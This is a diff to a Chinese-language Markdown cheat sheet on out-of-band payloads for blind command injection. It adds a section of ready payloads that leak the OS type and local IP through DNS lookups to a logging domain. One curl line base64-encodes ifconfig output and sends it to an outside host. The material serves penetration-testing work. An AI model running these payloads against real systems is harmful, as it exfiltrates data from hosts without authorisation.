@@ -128,7 +128,7 @@ yyy.test.0v0.com
 
 ### 0x4、payload使用技巧
 
-兼容windows和linux的命令
+用||兼容windows和linux
 
 ```bash
 ipconfig || ifconfig
@@ -182,5 +182,33 @@ window下的curl
 ```bash
 start http://xxxxxxxxx.test.0v0.com
 #该命令的作用是通过默认浏览器打开网站，缺点是会打开窗口
+```
+
+
+
+### 0x5、常用payload汇总
+
+
+
+```bash
+#1.判断系统类型
+ping `uname`.0v0.com || ping %OS%.0v0.com
+
+#2.通用ping，dns类型payload
+ping -n 3 xxx.0v0.com || ping -c 3 xxx.0v0.com
+
+C:\Windows\System32\cmd.exe /c "ping -n 3 test.com || ping -c 3 test.com"
+/bin/bash -c "ping -n 3 test.com || ping -c 3 test.com"
+
+
+======================================分割线=====================================
+
+
+#3.从DNS记录中获取源IP地址
+ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
+
+#4.获取命令结果
+curl test.0v0.com/`ifconfig|base64 -w 0`
+
 ```
 
